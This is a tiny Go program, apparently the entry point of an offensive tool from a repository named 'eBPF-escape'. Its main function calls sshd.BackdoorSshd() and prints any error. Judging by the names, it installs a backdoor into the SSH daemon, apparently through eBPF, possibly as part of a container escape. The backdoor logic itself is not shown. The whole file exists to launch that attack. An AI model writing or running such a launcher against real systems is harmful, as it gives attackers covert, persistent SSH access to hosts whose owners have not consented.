//go:build 386 || amd64

package main

import (
	"fmt"

	"github.com/yoeelingBin/eBPF-escape/pkg/sshd"
)

func main() {
	if err := sshd.BackdoorSshd(); err != nil {
		fmt.Println(err)
	}
}
